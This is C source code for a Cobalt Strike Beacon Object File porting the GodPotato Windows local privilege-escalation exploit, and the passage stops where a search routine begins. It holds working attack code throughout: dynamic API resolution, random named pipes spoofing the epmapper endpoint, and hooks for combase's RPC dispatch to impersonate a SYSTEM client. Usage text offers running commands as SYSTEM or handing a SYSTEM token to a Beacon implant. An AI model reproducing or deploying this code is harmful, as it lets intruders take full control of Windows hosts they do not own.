/*
 * GodPotato BOF - Port from https://github.com/BeichenDream/GodPotato
 * All WinAPIs resolved via LoadLibrary/GetProcAddress except those two.
 * First argument: command string (BeaconDataParse/BeaconDataExtract). Default: "cmd /c whoami"
 */
 #define SECURITY_WIN32
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <objidl.h>
 #include <stdlib.h>
 #include <string.h>
 #include "beacon.h"
#ifndef GOD_VERBOSE_LOGS
#define GOD_VERBOSE_LOGS 0
#endif

#if GOD_VERBOSE_LOGS
#define LOGI(...) BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__)
#else
#define LOGI(...) do { } while (0)
#endif
#define LOGK(...) BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__)
 
 #ifdef _WIN64
 #define PTR_SIZE 8
 #define RPC_SERVER_INTERFACE_SIZE 92
 #else
 #define PTR_SIZE 4
 #define RPC_SERVER_INTERFACE_SIZE 68
 #endif
 
 #define OBJREF_SIGNATURE 0x574f454d
 #define EPM_PROTOCOL_TCP 0x07
 #define EPM_PROTOCOL_NP 0x0f
 #define PAGE_READWRITE 0x04
 #define SYSTEM_EXTENDED_HANDLE_INFO 0x40
 #define STATUS_SUCCESS 0
 #define STATUS_INFO_LENGTH_MISMATCH ((LONG)0xC0000004)
 #define GOD_ERROR_PIPE_CONNECTED 0x217
 #define GOD_ERROR_IO_PENDING 997
 #define GOD_WAIT_TIMEOUT 258
 #define GOD_FILE_FLAG_OVERLAPPED 0x40000000
 #define GOD_PIPE_ACCESS_DUPLEX 0x00000003
 #define GOD_PIPE_TYPE_BYTE 0x00000000
 #define GOD_PIPE_READMODE_BYTE 0x00000000
 #define GOD_PIPE_WAIT 0
 #define GOD_PIPE_UNLIMITED_INSTANCES 255
 #define GOD_TOKEN_QUERY 0x0008
 #define GOD_TOKEN_ASSIGN_PRIMARY 0x0001
 #define GOD_TOKEN_DUPLICATE 0x0002
 #define GOD_TOKEN_IMPERSONATION_LEVEL 3
 #define GOD_TokenPrimary 1
 #define GOD_TokenImpersonation 2
 #define GOD_TokenUser 1
 #define GOD_TokenIntegrityLevel 25
 #define GOD_TokenImpersonationLevel 3
 #define GOD_TokenType 6
 #define GOD_CREATE_NO_WINDOW 0x08000000
 #define GOD_STARTF_USESTDHANDLES 0x00000100
 #define GOD_HANDLE_FLAG_INHERIT 0x00000001
 #define GOD_DUPLICATE_HANDLE_ACCESS 0x00000040
 #define GOD_QUERY_INFORMATION 0x00000400
 #define GOD_TOKEN_ELEVATION (GOD_TOKEN_QUERY|GOD_TOKEN_ASSIGN_PRIMARY|GOD_TOKEN_DUPLICATE|0x0004|0x0020|0x0080|0x0100)
 #define GOD_SystemIntegrityRid 0x00004000
 
 typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
 typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
 
 typedef HANDLE (WINAPI *fn_GetCurrentProcess)(void);
 typedef HANDLE (WINAPI *fn_GetCurrentThread)(void);
 typedef BOOL (WINAPI *fn_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
 typedef HANDLE (WINAPI *fn_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 typedef BOOL (WINAPI *fn_CloseHandle)(HANDLE);
 typedef HLOCAL (WINAPI *fn_LocalFree)(HLOCAL);
 typedef HMODULE (WINAPI *fn_GetModuleHandleW)(LPCWSTR);
 typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef HANDLE (WINAPI *fn_CreateNamedPipeW)(LPCWSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
 typedef BOOL (WINAPI *fn_ConnectNamedPipe)(HANDLE, LPOVERLAPPED);
 typedef HANDLE (WINAPI *fn_CreateEventW)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
 typedef DWORD (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
 typedef HANDLE (WINAPI *fn_CreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 typedef BOOL (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
 typedef BOOL (WINAPI *fn_SetHandleInformation)(HANDLE, DWORD, DWORD);
 typedef BOOL (WINAPI *fn_PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
 typedef BOOL (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef HANDLE (WINAPI *fn_OpenProcess)(DWORD, BOOL, DWORD);
 typedef BOOL (WINAPI *fn_DuplicateHandle)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
 typedef VOID (WINAPI *fn_Sleep)(DWORD);
 typedef DWORD (WINAPI *fn_GetCurrentProcessId)(void);
 typedef DWORD (WINAPI *fn_GetLastError)(void);
 typedef UINT  (WINAPI *fn_GetSystemDirectoryW)(LPWSTR, UINT);
 typedef int (WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
 
 typedef BOOL (WINAPI *fn_ConvertStringSecurityDescriptorToSecurityDescriptorW)(LPCWSTR, DWORD, PSECURITY_DESCRIPTOR*, PULONG);
 typedef BOOL (WINAPI *fn_ImpersonateNamedPipeClient)(HANDLE);
 typedef BOOL (WINAPI *fn_RevertToSelf)(void);
 typedef BOOL (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
 typedef BOOL (WINAPI *fn_OpenThreadToken)(HANDLE, DWORD, BOOL, PHANDLE);
 typedef BOOL (WINAPI *fn_GetTokenInformation)(HANDLE, DWORD, LPVOID, DWORD, PDWORD);
 typedef BOOL (WINAPI *fn_DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, PHANDLE);
 typedef BOOL (WINAPI *fn_CreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
 typedef BOOL (WINAPI *fn_CreateProcessAsUserW)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
 typedef BOOL (WINAPI *fn_ImpersonateLoggedOnUser)(HANDLE);
 typedef LPVOID (WINAPI *fn_GetSidSubAuthority)(PSID, DWORD);
 typedef PUCHAR (WINAPI *fn_GetSidSubAuthorityCount)(PSID);
 
 typedef LONG (WINAPI *fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
 typedef LONG (WINAPI *fn_NtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
 
 typedef HRESULT (WINAPI *fn_CoInitializeEx)(LPVOID, DWORD);
 typedef void (WINAPI *fn_CoUninitialize)(void);
 typedef HRESULT (WINAPI *fn_CoUnmarshalInterface)(IStream*, REFIID, LPVOID*);
 typedef HRESULT (WINAPI *fn_CreateBindCtx)(DWORD, IBindCtx**);
 typedef HRESULT (WINAPI *fn_CreateObjrefMoniker)(IUnknown*, IMoniker**);
 typedef void* (WINAPI *fn_CoTaskMemAlloc)(SIZE_T);
 typedef void (WINAPI *fn_CoTaskMemFree)(LPVOID);
 typedef HRESULT (WINAPI *fn_CoRegisterClassObject)(REFCLSID, IUnknown*, DWORD, DWORD, DWORD*);
 typedef HRESULT (WINAPI *fn_CoRevokeClassObject)(DWORD);
 typedef HRESULT (WINAPI *fn_CoCreateInstance)(REFCLSID, IUnknown*, DWORD, REFIID, void**);
 typedef HRESULT (WINAPI *fn_CoCreateInstanceEx)(REFCLSID, IUnknown*, DWORD, COSERVERINFO*, DWORD, MULTI_QI*);
 
 static struct {
	 HMODULE hKernel32;
	 HMODULE hNtdll;
	 HMODULE hAdvapi32;
	 HMODULE hOle32;
 
	 fn_GetCurrentProcess pGetCurrentProcess;
	 fn_GetCurrentThread pGetCurrentThread;
	 fn_CreateProcessW pCreateProcessW;
	 fn_CreateThread pCreateThread;
	 fn_CloseHandle pCloseHandle;
	 fn_LocalFree pLocalFree;
	 fn_GetModuleHandleW pGetModuleHandleW;
	 fn_VirtualProtect pVirtualProtect;
	 fn_CreateNamedPipeW pCreateNamedPipeW;
	 fn_ConnectNamedPipe pConnectNamedPipe;
	 fn_CreateEventW pCreateEventW;
	 fn_WaitForSingleObject pWaitForSingleObject;
	 fn_CreateFileW pCreateFileW;
	 fn_CreatePipe pCreatePipe;
	 fn_SetHandleInformation pSetHandleInformation;
	 fn_PeekNamedPipe pPeekNamedPipe;
	 fn_ReadFile pReadFile;
	 fn_OpenProcess pOpenProcess;
	 fn_DuplicateHandle pDuplicateHandle;
	 fn_Sleep pSleep;
	 fn_GetCurrentProcessId pGetCurrentProcessId;
	 fn_GetLastError pGetLastError;
	 fn_GetSystemDirectoryW pGetSystemDirectoryW;
	 fn_MultiByteToWideChar pMultiByteToWideChar;
 
	 fn_ConvertStringSecurityDescriptorToSecurityDescriptorW pConvertStringSecurityDescriptorToSecurityDescriptorW;
	 fn_ImpersonateNamedPipeClient pImpersonateNamedPipeClient;
	 fn_RevertToSelf pRevertToSelf;
	 fn_OpenProcessToken pOpenProcessToken;
	 fn_OpenThreadToken pOpenThreadToken;
	 fn_GetTokenInformation pGetTokenInformation;
	 fn_DuplicateTokenEx pDuplicateTokenEx;
	 fn_CreateProcessWithTokenW pCreateProcessWithTokenW;
	 fn_CreateProcessAsUserW pCreateProcessAsUserW;
	 fn_ImpersonateLoggedOnUser pImpersonateLoggedOnUser;
	 fn_GetSidSubAuthority pGetSidSubAuthority;
	 fn_GetSidSubAuthorityCount pGetSidSubAuthorityCount;
 
	 fn_NtQuerySystemInformation pNtQuerySystemInformation;
	 fn_NtDuplicateObject pNtDuplicateObject;
 
	 fn_CoInitializeEx pCoInitializeEx;
	 fn_CoUninitialize pCoUninitialize;
	 fn_CoUnmarshalInterface pCoUnmarshalInterface;
	 fn_CreateBindCtx pCreateBindCtx;
	 fn_CreateObjrefMoniker pCreateObjrefMoniker;
	 fn_CoTaskMemAlloc pCoTaskMemAlloc;
	 fn_CoTaskMemFree pCoTaskMemFree;
	 fn_CoRegisterClassObject pCoRegisterClassObject;
	 fn_CoRevokeClassObject pCoRevokeClassObject;
	 fn_CoCreateInstance pCoCreateInstance;
	 fn_CoCreateInstanceEx pCoCreateInstanceEx;
 } api;
 
 /* RPC / MIDL structures (minimal for pattern and dispatch) - prefixed to avoid conflict with system headers */
 typedef struct {
	 ULONG Length;
	 UCHAR InterfaceId[20];
	 UCHAR TransferSyntax[20];
	 void* DispatchTable;
	 ULONG RpcProtseqEndpointCount;
	 void* RpcProtseqEndpoint;
	 void* DefaultManagerEpv;
	 void* InterpreterInfo;
	 ULONG Flags;
 } GOD_RPC_SERVER_INTERFACE;
 
 typedef struct {
	 ULONG DispatchTableCount;
	 void* DispatchTable;
	 LONG_PTR Reserved;
 } GOD_RPC_DISPATCH_TABLE;
 
 typedef struct {
	 void* pStubDesc;
	 void* DispatchTable;
	 void* ProcString;
	 void* FmtStringOffset;
	 void* ThunkTable;
	 void* pTransferSyntax;
	 void* nCount;
	 void* pSyntaxInfo;
 } GOD_MIDL_SERVER_INFO;
 
 typedef struct {
	 PVOID ObjectPointer;
	 PVOID ProcessID;
	 PVOID HandleValue;
	 ULONG GrantedAccess;
	 USHORT CreatorBackTrackIndex;
	 USHORT ObjectType;
	 ULONG HandleAttributes;
	 ULONG Reserved;
 } SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
 
 typedef struct {
	 PVOID NumberOfHandles;
	 PVOID Reserved;
 } SYSTEM_HANDLE_INFORMATION_EX_HEADER;
 
 /* GodPotato context */
 static WCHAR server_pipe[128];
 static WCHAR client_pipe[128];
 static WCHAR client_pipe_extra[128];
 static char current_pipe_name[48];
 
 static void* combase_base;
 static SIZE_T combase_size;
 static void* dispatch_table_ptr;
 static void* use_protseq_ptr;
 static unsigned char use_protseq_param_count;
static void* hook_ptr_storage;
static int is_hook;
static int is_start;
static DWORD dispatch_table_old_protect;
static volatile HANDLE system_token;
static volatile int pipe_connected;
 static int token_type_index = -1;
 static GUID trigger_clsid;
 static WCHAR trigger_clsid_w[40];
 
 static void log_hr_status(const char* label, HRESULT hr)
 {
	 LOGI( "[*] %s hr=0x%08x (%ld)\n", label, (unsigned)hr, (long)hr);
 }
 
 static void log_last_error_status(const char* label)
 {
	 DWORD err = api.pGetLastError ? api.pGetLastError() : 0;
	 LOGI( "[*] %s last_error=%lu (0x%08lx)\n",
		 label, (unsigned long)err, (unsigned long)err);
 }
 
 static void append_hex_ascii(char* out, int* pos, unsigned long value)
 {
	 static const char hex[] = "0123456789abcdef";
	 int shift;
	 for (shift = (int)(sizeof(unsigned long) * 8) - 4; shift >= 0; shift -= 4)
		 out[(*pos)++] = hex[(value >> shift) & 0xf];
 }
 
 static unsigned long next_rng_value(unsigned long* state)
 {
	 unsigned long x = *state;
	 x ^= x << 13;
	 x ^= x >> 17;
	 x ^= x << 5;
	 if (!x) x = 0x6d2b79f5UL;
	 *state = x;
	 return x;
 }
 
 static void append_hex_fixed_ascii(char* out, int* pos, unsigned long value, int digits)
 {
	 static const char hex[] = "0123456789abcdef";
	 int shift = (digits - 1) * 4;
	 for (; shift >= 0; shift -= 4)
		 out[(*pos)++] = hex[(value >> shift) & 0xf];
 }
 
static int ascii_token_equals(const char* s, int len, const char* lit)
{
	int i = 0;
	if (!s || !lit || len <= 0)
		return 0;
	 while (lit[i] != '\0') {
		 char a, b;
		 if (i >= len)
			 return 0;
		 a = s[i];
		 b = lit[i];
		 if (a >= 'A' && a <= 'Z') a = (char)(a + ('a' - 'A'));
		 if (b >= 'A' && b <= 'Z') b = (char)(b + ('a' - 'A'));
		 if (a != b)
			 return 0;
		 i++;
	}
	return i == len;
}

static int is_help_token(const char* s, int len)
{
	return ascii_token_equals(s, len, "help") ||
	       ascii_token_equals(s, len, "-h") ||
	       ascii_token_equals(s, len, "--help") ||
	       ascii_token_equals(s, len, "/?");
}

static void print_usage(void)
{
	static char usage[] =
		"============================================================================================\n"
		"Use: godpotato [token] [-cmd <command>] [-pipe <name>]\n"
		"Argument       Description\n"
		"(none)         Run \"cmd /c whoami\" as SYSTEM.\n"
		"token          Apply a SYSTEM token to the current Beacon with BeaconUseToken().\n"
		"-cmd <cmd>     Run a command as SYSTEM in a spawned process.\n"
		"-pipe <name>   Use a custom named pipe. Default is a random pipe name.\n"
		"help,-h,--help,/?  Show this help.\n"
		"\n"
		"Examples:\n"
		"godpotato\n"
		"godpotato token\n"
		"godpotato help\n"
		"godpotato -cmd \"cmd /c whoami /priv\"\n"
		"godpotato -cmd \"cmd /c dir\"\n"
		"godpotato -cmd \"cmd /c whoami\" -pipe \"mycustompipe\"\n"
		"============================================================================================\n";
	BeaconOutput(CALLBACK_OUTPUT, usage, sizeof(usage) - 1);
}
 
 static void parse_command_and_pipe_text(char* text, int text_len, char** out_cmd, int* out_cmd_len, char** out_pipe, int* out_pipe_len)
 {
	 char* p = text;
	 int l = text_len;
	 int pipe_off = -1;
	 int i;
 
	 if (out_cmd) *out_cmd = NULL;
	 if (out_cmd_len) *out_cmd_len = 0;
	 if (out_pipe) *out_pipe = NULL;
	 if (out_pipe_len) *out_pipe_len = 0;
	 if (!text || text_len <= 0)
		 return;
 
	 while (l > 0 && (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n')) {
		 p++;
		 l--;
	 }
	 while (l > 0 && (p[l - 1] == '\0' || p[l - 1] == ' ' || p[l - 1] == '\t' || p[l - 1] == '\r' || p[l - 1] == '\n'))
		 l--;
	 if (l <= 0)
		 return;
 
	 for (i = 0; i + 5 < l; i++) {
		 char c1 = p[i + 1], c2 = p[i + 2], c3 = p[i + 3], c4 = p[i + 4];
		 if (c1 >= 'A' && c1 <= 'Z') c1 = (char)(c1 + ('a' - 'A'));
		 if (c2 >= 'A' && c2 <= 'Z') c2 = (char)(c2 + ('a' - 'A'));
		 if (c3 >= 'A' && c3 <= 'Z') c3 = (char)(c3 + ('a' - 'A'));
		 if (c4 >= 'A' && c4 <= 'Z') c4 = (char)(c4 + ('a' - 'A'));
		 if ((i == 0 || p[i - 1] == ' ' || p[i - 1] == '\t') &&
			 p[i] == '-' && c1 == 'p' && c2 == 'i' && c3 == 'p' && c4 == 'e' &&
			 (p[i + 5] == ' ' || p[i + 5] == '\t')) {
			 pipe_off = i;
			 break;
		 }
	 }
 
	 if (pipe_off >= 0) {
		 char* q = p + pipe_off + 6;
		 int m = l - (pipe_off + 6);
		 while (m > 0 && (*q == ' ' || *q == '\t')) { q++; m--; }
		 while (m > 0 && (q[m - 1] == '\0' || q[m - 1] == ' ' || q[m - 1] == '\t' || q[m - 1] == '\r' || q[m - 1] == '\n')) m--;
		 if (m > 0) {
			 if (out_pipe) *out_pipe = q;
			 if (out_pipe_len) *out_pipe_len = m;
		 }
	 }
 
	 if (l > 5 &&
		 p[0] == '-' &&
		 ((p[1] | 0x20) == 'c') &&
		 ((p[2] | 0x20) == 'm') &&
		 ((p[3] | 0x20) == 'd') &&
		 (p[4] == ' ' || p[4] == '\t')) {
		 char* q = p + 5;
		 int m = (pipe_off >= 0) ? (pipe_off - 5) : (l - 5);
		 while (m > 0 && (*q == ' ' || *q == '\t')) { q++; m--; }
		 while (m > 0 && (q[m - 1] == '\0' || q[m - 1] == ' ' || q[m - 1] == '\t' || q[m - 1] == '\r' || q[m - 1] == '\n')) m--;
		 if (m > 0) {
			 if (out_cmd) *out_cmd = q;
			 if (out_cmd_len) *out_cmd_len = m;
		 }
		 return;
	 }
 
	 if (pipe_off == 0)
		 return;
 
	 {
		 char* q = p;
		 int m = (pipe_off >= 0) ? pipe_off : l;
		 while (m > 0 && (q[m - 1] == '\0' || q[m - 1] == ' ' || q[m - 1] == '\t' || q[m - 1] == '\r' || q[m - 1] == '\n')) m--;
		 if (m > 0) {
			 if (out_cmd) *out_cmd = q;
			 if (out_cmd_len) *out_cmd_len = m;
		 }
	 }
 }
 
 static void init_trigger_clsid(const void* seed_ptr)
 {
	 unsigned long seed = api.pGetCurrentProcessId ? (unsigned long)api.pGetCurrentProcessId() : 1;
	 unsigned long ptr_seed = (unsigned long)(ULONG_PTR)seed_ptr;
	 unsigned long r;
	 char clsid_ascii[40];
	 int pos = 0;
	 int i;
 
	 seed ^= ptr_seed * 0x9e3779b9UL;
	 seed ^= seed >> 15;
	 seed *= 0x85ebca6bUL;
	 seed ^= seed >> 13;
	 if (!seed) seed = 0x4f1bbcdcUL;
 
	 r = next_rng_value(&seed);
	 trigger_clsid.Data1 = r;
 
	 r = next_rng_value(&seed);
	 trigger_clsid.Data2 = (USHORT)(r & 0xffff);
 
	 r = next_rng_value(&seed);
	 trigger_clsid.Data3 = (USHORT)(r & 0xffff);
 
	 for (i = 0; i < 8; i++) {
		 if ((i & 3) == 0)
			 r = next_rng_value(&seed);
		 trigger_clsid.Data4[i] = (BYTE)((r >> ((i & 3) * 8)) & 0xff);
	 }
 
	 append_hex_fixed_ascii(clsid_ascii, &pos, trigger_clsid.Data1, 8);
	 clsid_ascii[pos++] = '-';
	 append_hex_fixed_ascii(clsid_ascii, &pos, trigger_clsid.Data2, 4);
	 clsid_ascii[pos++] = '-';
	 append_hex_fixed_ascii(clsid_ascii, &pos, trigger_clsid.Data3, 4);
	 clsid_ascii[pos++] = '-';
	 append_hex_fixed_ascii(clsid_ascii, &pos, trigger_clsid.Data4[0], 2);
	 append_hex_fixed_ascii(clsid_ascii, &pos, trigger_clsid.Data4[1], 2);
	 clsid_ascii[pos++] = '-';
	 for (i = 2; i < 8; i++)
		 append_hex_fixed_ascii(clsid_ascii, &pos, trigger_clsid.Data4[i], 2);
	 clsid_ascii[pos] = '\0';
 
	 api.pMultiByteToWideChar(CP_ACP, 0, clsid_ascii, -1, trigger_clsid_w, (int)(sizeof(trigger_clsid_w) / sizeof(trigger_clsid_w[0])));
	LOGI( "[*] init_trigger_clsid: %s\n", clsid_ascii);
 }
 
 static void build_pipe_strings(const char* requested_name, int requested_len, const void* seed_ptr)
 {
	 static const char alnum[] = "abcdefghijklmnopqrstuvwxyz0123456789";
	 const char server_prefix[] = "\\\\.\\pipe\\";
	 const char server_suffix[] = "\\pipe\\epmapper";
	 const char client_prefix[] = "ncacn_np:localhost/pipe/";
	 const char client_suffix[] = "[\\pipe\\epmapper]";
	 const char client_extra_prefix[] = "ncacn_ip_tcp:";
	 unsigned long pid_seed = api.pGetCurrentProcessId ? (unsigned long)api.pGetCurrentProcessId() : 1;
	 unsigned long ptr_seed = (unsigned long)(ULONG_PTR)seed_ptr;
	 unsigned long rng;
	 int name_len;
	 int i, pos = 0;
	 char name_buf[48];
	 char server_ascii[128];
	 char client_ascii[128];
	 char client_extra_ascii[128];
	 int server_len = 0;
	 int client_len = 0;
	 int client_extra_len = 0;
 
	 /* seed from pid XOR ptr (ASLR provides per-run diversity) */
	 rng = pid_seed ^ (ptr_seed * 0xc4ceb9feUL) ^ 0x9e3779b9UL;
	 rng ^= rng >> 15; rng *= 0x85ebca6bUL; rng ^= rng >> 13;
	 if (!rng) rng = 0x5a4f3c2eUL;
 
	 if (requested_name && requested_len > 0) {
		 for (i = 0; i < requested_len && pos < (int)sizeof(name_buf) - 1; i++) {
			 char c = requested_name[i];
			 if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
				 (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
				 name_buf[pos++] = c;
			 } else {
				 name_buf[pos++] = '_';
			 }
		 }
	 } else {
		 /* random length 8..20 */
		 rng ^= rng << 13; rng ^= rng >> 17; rng ^= rng << 5;
		 name_len = 8 + (int)(rng % 13U);
		 for (i = 0; i < name_len; i++) {
			 rng ^= rng << 13; rng ^= rng >> 17; rng ^= rng << 5;
			 name_buf[pos++] = alnum[rng % 36U];
		 }
	 }
	 name_buf[pos] = '\0';
 
	 for (i = 0; name_buf[i] && i < (int)sizeof(current_pipe_name) - 1; i++)
		 current_pipe_name[i] = name_buf[i];
	 current_pipe_name[i] = '\0';
 
	 for (i = 0; server_prefix[i] && server_len < (int)sizeof(server_ascii) - 1; i++)
		 server_ascii[server_len++] = server_prefix[i];
	 for (i = 0; name_buf[i] && server_len < (int)sizeof(server_ascii) - 1; i++)
		 server_ascii[server_len++] = name_buf[i];
	 for (i = 0; server_suffix[i] && server_len < (int)sizeof(server_ascii) - 1; i++)
		 server_ascii[server_len++] = server_suffix[i];
	 server_ascii[server_len] = '\0';
 
	 for (i = 0; client_prefix[i] && client_len < (int)sizeof(client_ascii) - 1; i++)
		 client_ascii[client_len++] = client_prefix[i];
	 for (i = 0; name_buf[i] && client_len < (int)sizeof(client_ascii) - 1; i++)
		 client_ascii[client_len++] = name_buf[i];
	 for (i = 0; client_suffix[i] && client_len < (int)sizeof(client_ascii) - 1; i++)
		 client_ascii[client_len++] = client_suffix[i];
	 client_ascii[client_len] = '\0';
 
	 for (i = 0; client_extra_prefix[i] && client_extra_len < (int)sizeof(client_extra_ascii) - 1; i++)
		 client_extra_ascii[client_extra_len++] = client_extra_prefix[i];
	 rng ^= rng << 13; rng ^= rng >> 17; rng ^= rng << 5;
	 name_len = 8 + (int)(rng % 13U);
	 for (i = 0; i < name_len && client_extra_len < (int)sizeof(client_extra_ascii) - 1; i++) {
		 rng ^= rng << 13; rng ^= rng >> 17; rng ^= rng << 5;
		 client_extra_ascii[client_extra_len++] = alnum[rng % 36U];
	 }
	 client_extra_ascii[client_extra_len] = '\0';
 
	 api.pMultiByteToWideChar(CP_ACP, 0, server_ascii, -1, server_pipe, (int)(sizeof(server_pipe) / sizeof(server_pipe[0])));
	 api.pMultiByteToWideChar(CP_ACP, 0, client_ascii, -1, client_pipe, (int)(sizeof(client_pipe) / sizeof(client_pipe[0])));
	 api.pMultiByteToWideChar(CP_ACP, 0, client_extra_ascii, -1, client_pipe_extra, (int)(sizeof(client_pipe_extra) / sizeof(client_pipe_extra[0])));
	LOGI(
		"[*] build_pipe_strings: requested_len=%d seed=%p name=%s\n",
		requested_len, seed_ptr, current_pipe_name);
	LOGI( "[*] build_pipe_strings: server=%ls\n", server_pipe);
	LOGI( "[*] build_pipe_strings: client=%ls\n", client_pipe);
	LOGI( "[*] build_pipe_strings: client_extra=%ls\n", client_pipe_extra);
 }
 
 /* Forward */
 static int use_protseq_hook_impl(void* ppdsaNewBindings, void* ppdsaNewSecurity);
 typedef int (WINAPI *fn_use_protseq4)(void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq5)(void*, void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq6)(void*, void*, void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq7)(void*, void*, void*, void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq8)(void*, void*, void*, void*, void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq9)(void*, void*, void*, void*, void*, void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq10)(void*, void*, void*, void*, void*, void*, void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq11)(void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq12)(void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq13)(void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*);
 typedef int (WINAPI *fn_use_protseq14)(void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*, void*);
 
 static int WINAPI hook4(void* p0, void* p1, void* p2, void* p3) { return use_protseq_hook_impl(p2, p3); }
 static int WINAPI hook5(void* p0, void* p1, void* p2, void* p3, void* p4) { return use_protseq_hook_impl(p3, p4); }
 static int WINAPI hook6(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5) { return use_protseq_hook_impl(p4, p5); }
 static int WINAPI hook7(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6) { return use_protseq_hook_impl(p5, p6); }
 static int WINAPI hook8(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7) { return use_protseq_hook_impl(p6, p7); }
 static int WINAPI hook9(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8) { return use_protseq_hook_impl(p7, p8); }
 static int WINAPI hook10(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9) { return use_protseq_hook_impl(p8, p9); }
 static int WINAPI hook11(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10) { return use_protseq_hook_impl(p9, p10); }
 static int WINAPI hook12(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11) { return use_protseq_hook_impl(p10, p11); }
 static int WINAPI hook13(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12) { return use_protseq_hook_impl(p11, p12); }
 static int WINAPI hook14(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12, void* p13) { return use_protseq_hook_impl(p12, p13); }
 
 static int use_protseq_hook_impl(void* ppdsaNewBindings, void* ppdsaNewSecurity)
 {
	 const WCHAR* endpoints[] = { client_pipe, client_pipe_extra };
	 int entry_size = 3;
	 if (!ppdsaNewBindings) return -1;
	 int memory_size;
	 size_t i, j;
	 short* pdsa;
	 (void)ppdsaNewSecurity;
 
	 for (i = 0; i < sizeof(endpoints) / sizeof(endpoints[0]); i++)
		 entry_size += (int)(wcslen(endpoints[i]) + 1);
	 memory_size = entry_size * (int)sizeof(short) + 10;
	 pdsa = (short*)api.pCoTaskMemAlloc((SIZE_T)memory_size);
	 if (!pdsa) return -1;
	 memset(pdsa, 0, (size_t)memory_size);
 
	 {
		 int offset = 0;
		 *(short*)((char*)pdsa + offset) = (short)entry_size;
		 offset += 2;
		 *(short*)((char*)pdsa + offset) = (short)(entry_size - 2);
		 offset += 2;
		 for (i = 0; i < sizeof(endpoints) / sizeof(endpoints[0]); i++) {
			 const WCHAR* ep = endpoints[i];
			 for (j = 0; ep[j]; j++) {
				 *(short*)((char*)pdsa + offset) = (short)ep[j];
				 offset += 2;
			 }
			 offset += 2;
		 }
	 }
 
	 *(void**)((char*)ppdsaNewBindings) = pdsa;
	 return 0;
 }
 
 static void* get_hook_func(void)
 {
	 void* tbl[15];
	 tbl[4]  = (void*)hook4;
	 tbl[5]  = (void*)hook5;
	 tbl[6]  = (void*)hook6;
	 tbl[7]  = (void*)hook7;
	 tbl[8]  = (void*)hook8;
	 tbl[9]  = (void*)hook9;
	 tbl[10] = (void*)hook10;
	 tbl[11] = (void*)hook11;
	 tbl[12] = (void*)hook12;
	 tbl[13] = (void*)hook13;
	 tbl[14] = (void*)hook14;
	 if (use_protseq_param_count >= 4 && use_protseq_param_count <= 14)
		 return tbl[use_protseq_param_count];
	 return (void*)hook4;
 }
 
 /* Sunday search */
 static int sunday_search(const unsigned char* text, size_t text_len, const unsigned char* pattern, size_t pattern_len)
